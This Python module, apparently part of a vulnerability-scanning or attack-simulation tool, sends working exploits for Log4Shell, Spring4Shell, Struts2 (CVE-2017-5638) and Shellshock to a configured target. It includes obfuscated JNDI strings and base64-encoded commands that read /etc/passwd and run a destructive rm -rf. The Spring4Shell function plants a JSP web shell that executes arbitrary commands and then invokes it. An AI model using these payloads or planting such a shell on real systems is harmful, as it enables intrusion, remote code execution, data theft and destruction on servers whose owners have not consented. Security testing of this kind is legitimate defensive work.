from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_log4j_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Log4Shell (CVE-2021-44228) Simulation
    Injects JNDI patterns into headers and fields.
    """
    # Detection: We look for immediate 500s or JNDI output reflection (rare).
    # Real detection requires OOB (Out of Band) interaction (DNS lookups), 
    # which we can't easily verify in Local/Dev mode without an OOB listener.
    # However, we can check if the server *crashes* or hangs trying to reach out.
    
    payloads = [
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}", # Obfuscated
        "${jndi:dns://127.0.0.1/a}",
        "${jndi:rmi://127.0.0.1/a}",
    ]
    
    if scenario.config.get("aggressive"):
        print("    [!!!] LOG4SHELL AGGRESSIVE: Adding RCE payloads")
        payloads.extend([
            "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}", # cat /etc/passwd
            "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/cm0gLXJmIC8qdG1wKg==}", # rm -rf /*tmp* (Destructive)
        ])
    
    headers_to_poison = ["User-Agent", "X-Api-Version", "Referer", "Authentication"]
    issues = []
    
    for p in payloads:
        # 1. Header Poisoning
        headers = {h: p for h in headers_to_poison}
        try:
            resp = client.send(scenario.method, scenario.target, headers=headers)
            # If server delays significantly (trying to connect), it's a sign
            if resp.elapsed_ms > 2000:
                issues.append(f"Log4Shell: Response delayed ({resp.elapsed_ms}ms) - server might be calling out")
            if resp.status_code >= 500:
                issues.append("Log4Shell: Server Error (500) after JNDI injection")
        except:
             pass

        # 2. Field Poisoning
        # (Assuming JSON body targets defined in config or generic generic approach)
        # We'll skip body for now to keep it fast, headers are primary Log4j vector.

    return {
        "scenario_id": scenario.id,
        "attack_type": "log4shell",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Spring4Shell (CVE-2022-22965)
    Class Loader Manipulation via Data Binding (Java/Spring).
    Attempts to DROP A WEB SHELL (Destructive).
    """
    
    # 1. Exploit: Drop the Web Shell (bp_shell.jsp)
    shell_filename = "bp_shell.jsp"
    shell_content = r"%{prefix}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } %{suffix}i"
    
    exploit_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": shell_content,
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT", # Standard Tomcat Root
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "bp_shell",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }
    
    # Send Exploit
    client.send(scenario.method, scenario.target, form_body=exploit_payload) 
    
    # 2. Verification: Convert shell to executable state (flush logs via request) - usually happens automatically
    # 3. Execution: Call the shell
    
    issues = []
    
    # Try to execute a command via the dropped shell
    # Use a specific calculation or unique string to verify execution
    canary = "bp_rce_verified"
    shell_url = f"{client.base_url}/{shell_filename}?cmd=echo+{canary}"
    resp = client.send("GET", shell_url)
    
    # Check for success (RCE output)
    # STRICT CHECK: Must see the canary string. 200 OK alone is NOT enough (might be a catch-all route).
    if resp.status_code == 200 and canary in resp.text:
        issues.append(f"Spring4Shell SUCCESS: Web Shell dropped & executed at /{shell_filename}")
        issues.append(f"RCE Output: {resp.text[:100]}...")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "spring4shell",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_struts2_rce(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Apache Struts2 RCE (Equifax Breach style) - CVE-2017-5638
    OGNL Injection in Content-Type header.
    """
    ognl = "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo VULNERABLE'}:{'bash','-c','echo VULNERABLE'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())"
    
    # Wrap in standard exploit wrapper
    payload = "%{(#_='=').(" + ognl + ")}"
    
    headers = {"Content-Type": payload}
    
    resp = client.send(scenario.method, scenario.target, headers=headers)
    
    issues = []
    if "VULNERABLE" in resp.text:
        issues.append("Struts2 RCE Executed: 'VULNERABLE' echoed back")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "struts2_rce",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Shellshock (CVE-2014-6271)
    Injects malicious function definition in User-Agent.
    """
    payload = "() { :;}; echo; echo 'VULNERABLE_SHELLSHOCK'"
    resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
    issues = []
    if "VULNERABLE_SHELLSHOCK" in resp.text:
        issues.append("Shellshock (CVE-2014-6271) RCE Executed.")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "shellshock",
        "passed": not issues,
        "details": {"issues": issues}
    }
